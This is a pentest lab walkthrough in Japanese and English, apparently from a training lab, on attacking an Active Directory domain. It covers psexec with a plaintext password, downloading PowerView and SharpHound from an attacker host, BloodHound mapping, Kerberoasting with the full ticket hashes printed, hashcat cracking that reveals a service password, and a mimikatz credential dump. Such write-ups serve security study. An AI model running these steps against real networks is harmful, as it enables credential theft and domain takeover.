> ### 参考URL
> - https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview
> - https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
> - https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#using-powerview
> - https://nored0x.github.io/red-teaming/active-directory-domain-enumeration-part-1/


# PowerView

## Get the initial shell
```
┌──(kali㉿kali)-[~]
└─$ psexec.py david:dsfdf34534tdfGDFG5rdgr@10.11.1.120

C:\Windows\system32> whoami
nt authority\system
```

## Spawing the PowerShell
```
C:\Windows\system32> powershell -ep bypass

PS C:\Windows\Temp> Invoke-Webrequest -OutFile PowerView.ps1 -Uri http://192.168.119.249/PowerView.ps1
PS C:\Windows\Temp> Import-Module .\PowerView.ps1
```

## Domain name and Domain Controller name
```
PS C:\Windows\Temp> Get-NetDomain

Forest                  : xor.com
DomainControllers       : {xor-dc01.xor.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : xor-dc01.xor.com
RidRoleOwner            : xor-dc01.xor.com
InfrastructureRoleOwner : xor-dc01.xor.com
Name                    : xor.com
```

## User enum
```
PS C:\Windows\Temp> Get-NetUser | select cn

Administrator  
Guest          
krbtgt         
Chris          
Pedro          
Maria          
Bob            
Ralph          
Bethany        
Bruce          
Sherlock       
Nicky          
Jeff           
Harry          
Kevin          
Cory           
Nina           
Brett          
Carol          
Daisy          
John           
Pete           
Adam           
David          
Albert         
ExchangeService
extmailservice 
SQLServer
```

## Enum SPN (Service Principal Name)
```
Get-NetUser | select serviceprincipalname

HTTP/ExchangeService.xor.com   
HTTP/ExtMail.xor.com           
MSSQLSvc/xor-app23.xor.com:1433
```

## Name Resolutions Services
```
PS C:\Windows\Temp> nslookup ExchangeService.xor.com
nslookup ExchangeService.xor.com
Server:  localhost
Address:  127.0.0.1

Name:    ExchangeService.xor.com
Address:  10.60.60.227

PS C:\Windows\Temp> nslookup ExtMail.xor.com
nslookup ExtMail.xor.com
Server:  localhost
Address:  127.0.0.1

Name:    ExtMail.xor.com
Address:  10.60.60.227

PS C:\Windows\Temp> nslookup xor-app23.xor.com
nslookup xor-app23.xor.com
Server:  localhost
Address:  127.0.0.1

Name:    xor-app23.xor.com
Address:  10.11.1.121
```

## Group Enum
```
Get-NetGroup | select samaccountname, admincount, description
```

about the output of `Get-NetGroup`, `name` and `samaccountname` were same

## Admin Group
```
PS C:\Windows\Temp> Get-DomainGroup *admin* | select samaccountname

samaccountname                
--------------                
Administrators                
Hyper-V Administrators        
Storage Replica Administrators
Schema Admins                 
Enterprise Admins             
Domain Admins                 
Key Admins                    
Enterprise Key Admins         
DnsAdmins
```

## Each Group Info
```
PS C:\Windows\Temp> Get-NetGroup 'Domain Admins'
Get-NetGroup 'Domain Admins'


grouptype              : GLOBAL_SCOPE, SECURITY
admincount             : 1
name                   : Domain Admins
samaccounttype         : GROUP_OBJECT
samaccountname         : Domain Admins
whenchanged            : 5/20/2019 8:13:09 PM
objectsid              : S-1-5-21-2293535422-227910474-3663383505-512
objectclass            : {top, group}
cn                     : Domain Admins
instancetype           : 4
usnchanged             : 13265
dscorepropagationdata  : {5/20/2019 8:13:09 PM, 5/20/2019 7:58:00 PM, 1/1/1601 12:04:16 AM}
iscriticalsystemobject : True
description            : Designated administrators of the domain
memberof               : {CN=Denied RODC Password Replication Group,CN=Users,DC=xor,DC=com, 
                         CN=Administrators,CN=Builtin,DC=xor,DC=com}
member                 : {CN=Albert,OU=AdminPersonal,OU=xorUsr,DC=xor,DC=com, 
                         CN=David,OU=AdminPersonal,OU=xorUsr,DC=xor,DC=com, CN=Administrator,CN=Users,DC=xor,DC=com}
usncreated             : 12345
whencreated            : 5/20/2019 7:58:00 PM
distinguishedname      : CN=Domain Admins,CN=Users,DC=xor,DC=com
objectguid             : cca1a9da-dbf8-4743-8b23-b3070ba02272
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=xor,DC=com
```

## Johnはどのグループに属してるか？

上と同じように考えて、`Get-NetUser`に特定のユーザ名を与えればよい

```
PS C:\Windows\Temp> Get-NetUser 'John'

logoncount            : 0
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=John,OU=ServerPersonal,OU=xorUsr,DC=xor,DC=com
objectclass           : {top, person, organizationalPerson, user}
displayname           : John
userprincipalname     : john@xor.com
name                  : John
objectsid             : S-1-5-21-2293535422-227910474-3663383505-1120
samaccountname        : john
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
cn                    : John
whenchanged           : 5/20/2019 8:07:08 PM
instancetype          : 4
usncreated            : 12888
objectguid            : f719c65d-1528-455a-9e27-4669f1d3bac1
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=xor,DC=com
dscorepropagationdata : 1/1/1601 12:00:00 AM
memberof              : {CN=Server_Personel,OU=xorGrps,DC=xor,DC=com, CN=Mail_Editor,OU=xorGrps,DC=xor,DC=com}
lastlogon             : 12/31/1600 4:00:00 PM
badpwdcount           : 0
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 5/20/2019 8:07:08 PM
countrycode           : 0
primarygroupid        : 513
pwdlastset            : 5/20/2019 1:07:08 PM
usnchanged            : 12892
```


## Domain Adminsグループに誰が属しているか？
```
PS C:\Windows\Temp> Get-DomainGroupMember -Identity 'Domain Admins' -Recurse

GroupDomain             : xor.com
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=xor,DC=com
MemberDomain            : xor.com
MemberName              : albert
MemberDistinguishedName : CN=Albert,OU=AdminPersonal,OU=xorUsr,DC=xor,DC=com
MemberObjectClass       : user
MemberSID               : S-1-5-21-2293535422-227910474-3663383505-1124

GroupDomain             : xor.com
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=xor,DC=com
MemberDomain            : xor.com
MemberName              : david
MemberDistinguishedName : CN=David,OU=AdminPersonal,OU=xorUsr,DC=xor,DC=com
MemberObjectClass       : user
MemberSID               : S-1-5-21-2293535422-227910474-3663383505-1123

GroupDomain             : xor.com
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=xor,DC=com
MemberDomain            : xor.com
MemberName              : Administrator
MemberDistinguishedName : CN=Administrator,CN=Users,DC=xor,DC=com
MemberObjectClass       : user
MemberSID               : S-1-5-21-2293535422-227910474-3663383505-500
```

-> これは、Blodd Houndの「Find all Domains Admin」で表示されるアカウント達と等しい。

# Blood Hound
```
┌──(kali㉿kali)-[~]
└─$ sudo neo4j console
```

Browser is opened, so login to Blood Hound (User: neo4j, Pass: blood).

Open the new terminal and type:

```
┌──(kali㉿kali)-[~]
└─$ bloodhound
```

Donload SharpHound.ps1 to the target and Import it:

```
PS> Invoke-Webrequest -OutFile SharpHound.ps1 -Uri http://192.168.119.249/SharpHound.ps1
PS> Import-Module .\SharpHound.ps1
```

Making the .zip file:

```
Invoke-Bloodhound -CollectionMethod All -Domain xor.com -ZipFileName xorloot.zip
```

<- ここで少し固まるかもしれないが、`clear`とか打ってみて、最後の方に **You can upload this file directly...** 見たいのが出ればOK.

Send this .zip file to Kali (ftp bin put) -> Upload the .zip file to bloodhound page.

### Find all Domain Admins

![xor_hound_result](https://user-images.githubusercontent.com/85237728/146380100-678a01d2-9685-444d-b91f-b60a37232379.png)

### Find Shortest Paths to Domain Admins

![Find_Shortest_Paths_to_Domain_Admins](https://user-images.githubusercontent.com/85237728/146381092-0d4d671e-df33-41e3-bbbd-5ea230d372d8.png)

# Kerberoast（サービスアカウントに対する）

参考日本語サイト：https://ariastark.hatenablog.com/entry/ad-hacking-kerberoast
<- 結果的に得られるものはmimikatzで.kirbiファイルをexportしてtgsrepcrack.pyでクラックするやつと同じだ。

### Kerberoastable Users (by Blood Hound)
- EXTMAILSERVICEX@XOR.COM
- EXCHANGESERVICE@XOR.COM
- SQLSERVER@XOR.COM
- KRBTGT@XOR.COM

> SPNが登録されたユーザがドメイン内にいる場合、他のドメインユーザから、KDCに対してチケットリクエストを行い、サービスチケットを取得することが可能です。サービスチケットには、SPNに紐づくユーザのパスワードハッシュが含まれているので、これを復号することによって、平文のパスワードを取得することが可能です。この一連の攻撃のことをKerberoastといいます。

*PowerView.ps1*の`Invoke-Kerberoast`で、SPNに関連づけられたアカウントのパスワードハッシュを取得する。（NTLMハッシュじゃなくて、**$krb5t$** のハッシュ）

```
PS C:\Windows\Temp> Invoke-Kerberoast    
Invoke-Kerberoast


SamAccountName       : ExchangeService
DistinguishedName    : CN=ExchangeService,OU=ServiceAccounts,OU=xorUsr,DC=xor,DC=com
ServicePrincipalName : HTTP/ExchangeService.xor.com
TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*ExchangeService$xor.com$HTTP/ExchangeService.xor.com*$DD46784A85EA7F412F2E9020676C6
                       CF0$E68969ACEB0610D1DA9E3971D02CC830D77A9AD92985EA503746677C8F1A2C84896AF4CF689532EA40B055C759BE
                       3BEB0E09D22E425642DFA020493C378CB6907551DD8A9967AF4C85B16CFED355CE4DE3877D56759A791EBEBBD8BF7A68
                       7A5CA85BCE739939F17C9C94A1CCC19991027C19506AA24D3F5EFEE1254E82E6BCD6DC533A2821A85933DE9A0185DE85
                       724925C2C3FCE62FE7C3440E5951D8A213A04481DC35D295028A4F083A9A8A8A60F1AC95CF3DC545967EC816B032AC70
                       6EFEBCA7C0BC963A56529DB2AA8ECDCC3BAE7D2F5CA865BC0436F5CA8A681098CD0D7725E15950088D399B9506B6EE52
                       DB36E2B561FC408CAD05B72F3F49C9240BF0BB67A2D7382DBD84005AC53DF27B05E78810EEC1E98FD251FFDAD6F64D47
                       45E5478D0D745FF0A82AFAECB484E41F755073CB83A76572611E77C84CDC7E669E96765AE15AC7332B7804F06730999E
                       5AC52F7B4A7085FD821DAB6F7BE5991834CFC12FBC0A16521C25048C84F09C26B3C787F9CA00C32C449257B02C208CA9
                       145A50890792EC81BA2A6FE716A558A491C499CC07FD6957F20721FBBB95F88271FB4E20C689AC53D002A9F489E4C47D
                       1EA4EA66D0F92069FA67CFCDA07E3079FCCD2F80B577CB6F213A8A473AA11F9EE6F1BE8D266C8D249D24B28B9977D6EB
                       DF960AEF23F3824E1CCCF9C56BE60921DCCF24F445291BC64807F4D95567C482A705E7DFA2D4EA1C63D318BBF61A0444
                       9668F1C7D61F52F2B872CDFDA09A072CCAF64D20AAD27C3523B8E0F552A2F40AE10C6514309782F27F3B59018FF18DAD
                       DC86CAFFF6FB8E7F6E04810B6F171160D226F0C8706F8DDDCE6BEB038D72CBFD3C274086D561F045FD9A6E2D1D74E8F6
                       7BE25370F992802D86F72FB180E2DFE23456202424A27F5E8955A9CBF57D6908EB4B4B7B5DBA961C6121BA8351005FA9
                       6D48092087BFB2F33917F306722DFA337B30A1107CCB623B4A09DF48A636940CD471D2F03D623560545B0B27D590AC33
                       1E9F272AAACD03CC384FB75AC33E146EC2E918854519455CFE800FFD9127DAA20F2E3C80BF3DF9A060785CC285A83A30
                       7726269425ABD1AD5E0F8885CBE90A3A3617B65C9157369D3D561E1EA6F0F2AAF3515316517188ECA9BBC34D3D26C0F3
                       D4E1DE80ED01C765030C47C1A666CB8ACD1D2762C2CE7885D3D4A88846C7113B149463BCD5C374CB3C8727E4D89F12A4
                       73FEC9FDFA6923AEBDD785FF349E36F5F7A143C31BD77B7BE01CF43F3B967D455B987465D245044B89712E22358FEFC8
                       BA456C4E9597FC39FB736396B13436B88E137B34115D224F79B15CFB0E2291E83B35367060D2719765A1EC4B54B90B4D
                       8BFD985226C782E623F87A8A8D52458AB1EDF052877B6917E8708F6619E0FEC85F30702D5A83BEF2F7AF9BFD6DB4D0D6
                       3F39532EB85E24CDB99CBF292210EE644A3C2E11BBD8893B0AF8698112D89CB0D6D420FC764128F483C9C23E38EA4565
                       41AF6A8A7B08B0CAAA657689B887B95339A3CEFECE

SamAccountName       : extmailservice
DistinguishedName    : CN=extmailservice,OU=ServiceAccounts,OU=xorUsr,DC=xor,DC=com
ServicePrincipalName : HTTP/ExtMail.xor.com
TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*extmailservice$xor.com$HTTP/ExtMail.xor.com*$5C69AEB3072FF59C936D6052A6F2D1B4$2EC24
                       0DBA37B8837A39E9803E3F92A9C99FD3F6DC3EDC756B37108F1BC92C898583DECEE610D5F3D10F37EFDA68BB17565860
                       D6F7E94C90D72D1921280F8ECE611BA52620F263606CBEC70B34A62824AE2F79F8B0416322D1635AC86B12F9A464AA32
                       3005D24D71ECD1362267741C810B9D3183C54735D2C38AAE74DF6F3CA11661246A561825A25257BEFB5C98D7E5E3FFC3
                       6005A20143FEC5B0009E0F5E9B3915106B6CB6BAD6F104255D8EA74233A96AB8B77410B69C6CF904AC6BDA34DB1BDCAA
                       A456AC9243D997230287D9DC02CCDFCB8D97D241C6C1B7E23ACFA4BEF69D3AC654984CF346D46AA051CBFF4BC84C790A
                       87CF11E047C1FB9D69D76EC06638E103D5B8F9159F136E55C9ED606AB916A193B29AF5BFB7BB05133E4797040AFF5BE7
                       B1AAC8B7B0C46F780E5A9F0A1458B56A23E54D7CDA72EB639C9E9894D3952615B64F7AFCC25790A1864DA719AB10042D
                       AC3D54E6E10B3829C27F26B3981A25D3D44C32234A2A0B5892172AEED7B6C10A1680FEE54E483549D1A60D76A4E132C7
                       273E476F55EAE6B0C0FB2D811E7D37CAABE80952F801C30E667E12358824574BAAB814AF76E577E087DA630B072531C2
                       25E89560F02802584A262B3D698D3C6690FC435C22A77F33D597AFF0BB262921CF571905F745C33F30D6F57F2BE56E53
                       89B4BAC469C2BD02224B9B2EFC0FC84A191161462E0DB003D9DF9AB918DCEF6B67CFD7C13B245EA38508B5D49BDF8F52
                       29A9B30DF52CA6C0285ADEED398E727631F57452AF6492643ED7D823B14BF8CE3B777A8DC1E53C354E6F09C30A90ECEB
                       C691ACFB25E6E291A2BE039B381E55F2BE051D540E3A1A5B4A0383E41BE24F4B473A9DE240EA8899F1554F1E384DF9BB
                       877BCB9176FBBE8DFDFA5C468C60B2E3C207348476915D8EBB615349F5328028E5A8FB5E42FAEF3C528194714E1BF532
                       7EB6D9D8BE3D975932357C18EA9E91D572AD7EA6EC6FC3301A86F66D72A87736A0E78E6D95048A08D15DCB0E31D5C21F
                       ED25BD83BD4B949EF1310DE82C3BCD0822DC7198D315647437FA9F90AFEBF156FB45E3A7F81825E8B28C34FDEF0C6363
                       5FEE363E0A6626328B62AAE1EB518AB1E5AC60AC12D64F2F71B6B76EECB2813C54028BFCC7BE4844F300A4A75902C819
                       6F7C5991DEFDB24BE00F3CD77BD0AD692ADA0E4EEC6B0965DEA26F9D2048B4CD5F43649EF19D57D1A002CF5B8041F21D
                       F7B0852C1C7C00CF752A0BFDCA1108C9553712F667971DE04FABF1DC608B23BB4A6813C3C71DB402895E352DCCB4BA77
                       80D91CF3D36CD45FCD197D9233610006449235EBFD2595622028019C3F4D82841FD522C4D1042AEEA0343A193236F821
                       119A42749C4BA5D45C829180F3575DC936D0EA2EC27E74465FC87E26EB3AA891BFA0C78D2B7050A004CDF40D6C02ACF1
                       B2BC837D4F4A20DADB8DFCC53A85D1F695120EFB79DB3127732F5DCA1CD5BC19DBBBE2EE52EF1E73EA31D8AE794C7BE7
                       036425E1A4FDB5C02EEAD4B468F9C8493

SamAccountName       : sqlServer
DistinguishedName    : CN=SQLServer,OU=ServiceAccounts,OU=xorUsr,DC=xor,DC=com
ServicePrincipalName : MSSQLSvc/xor-app23.xor.com:1433
TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*sqlServer$xor.com$MSSQLSvc/xor-app23.xor.com:1433*$7D05AC3B72BF45FF27C14C6967FAC6E1
                       $29CA727B40CCC80B886F88BE9B7CC584B5805E53E81E0BCDC72941C45BB8991A5A4D86BA74D17917AE70F48FF355AFA
                       AD31A0A11C64D27DA0BD2D7C7B3D3151F3A9A9F0FEC9754FCE6B322014A6C8E4ED11A72AA56C638701BBA78AC325940A
                       AC42CCEE1F59F5E8B34B4E0AC3343159AE3FF30E9DA596754370442B1D514FDC97A9EA1807FDC08B293EA6B296C34AE8
                       5178FB6AD7EA64388F0053FB54653F9682B83FC63691DE27AE6113EA51F0D84D98AFA6952F9D9E1B704A3227C9FB79C7
                       2E9AEA55CBF45ED2791CCCE7F5600011571871BBEBA9C7AF52E2A755C20D9C9FE8629BD67FC953D3194CA0157E688193
                       63F7476E67D14EA62F2813BFCD1E1CEE3D439FC3D7A6CF304DF1BAADBB4E1BFC90C39A78086F21581E34FA304A37ED22
                       7AF3101FB12D5C0965D0D84FD01AB9F27697CC71FE0C09D67C0EF504E6CD4524FDA8310B0873A5DBC180C875D6DC0A5B
                       BE6EE3E3A836334548D24E1BCDE248A5B3943ABB9A533040DB28BBB43B7F407778751FB07868502B4171C9F570B26F91
                       9C599CA6403CB63BB46B4CC0530D40D63BEBBA87C5A346FAE5C932CA386CEB515867BE80361B135F5664493DC569E942
                       37BE4BFE4DD709E0BBA3DCDD4A6845E61C79575E522A17D2D2737255F841AB284A6B8F0D175617C3D2E1A220D778A964
                       6884DA9E84B6C73FFBA231590BD895C512E8D212D6F9D9A0B06681B83FF9DFAC7CD208762765FF99D4F0D9DDFA016512
                       84D9A91658C7E5FC94BCA313204C0B821F8704572FC01C0E2BACD2E4E14D4A26008057165E0B8FF26151AA5FF1E3AB25
                       5EED5FE1C5B3A07C4EBBC1817480CEADAAAC54A02CFB84E92571F8AF417D9B51C46373C12F0BD21F1A9AF81DE02E0BBC
                       F7E3E42FFD9B3E3F946CC9349CC2A6E3C0026A7FFC13940049D59C12A3A92843CCE86C6265F8AAB4A3C8209A93301E2E
                       D088898C6755DD3D5C59314BD9BE8CCA1E6305CC94939F9D0A0395267A8471EEF2212AC4ABD9F635F1996C4F6730DB48
                       78A3B31D97FEE64281214DF8A4A930066336D6B6D7CEA57CF07E31FC3A6B72677564A8632B1085F72A249B4B6D59523F
                       7ADC5D42B4CF4F4074BA3F209C0ACE091F5EFB9E621D4708A95646AA216FD21D4A24181FD927F308339352430DC02A67
                       55BA4BBBA3D2C656B86D2FA41FC33EF8E1E07910786CD4B887ACF67E6BAD1C5B54EA120EDFDCFA550F6883625C345C7B
                       D5CACD644A3719A2B3A6419F648340C5F3BA0FCE5EC2DEE29D29C2C939E2D501ECB17628EF83FF174FE3125873991164
                       492FF7CD3C29DCBBCBE427794A1449B1BA3AACEC8CEACE3BD648238A47C783DF40912FBADBD5A1E4EB96253702BBCC08
                       2A38D7906CDB71CC9E927417B05286AB81EEC787BEAFFC08D855D08FBC3CFC6C198AF3A53959CA86C2600BDC864B5605
                       6EF14D769350FF9C3534E08F37CC7ED49E9200ED1B0141BAEB6AC5FE2ADAA5E9808A2A67042F84062FFDD7EB3E8BFD1E
                       66CEA53AE9932663B9EE15379579ADFDEEA8669
```

hashcatで使えるように以下のコマンドでハッシュを抽出してhashes.kerberoastとして保存。

```
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```

Kaliにhashes.kerberoastを送ってクラック。

```
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
```

結果的に、**MSSQLSvc/xor-app23.xor.com:1433 (SQLSERVER@XOR.COM)** のクラックだけ成功した。パスワードは **shantewhite**

# Mimikatz
```
mimikatz # lsadump::lsa /patch
```

`sekurlsa::logonpasswords`がうまく動かなかったら、mimikatz**211**の方を使ってみよ。


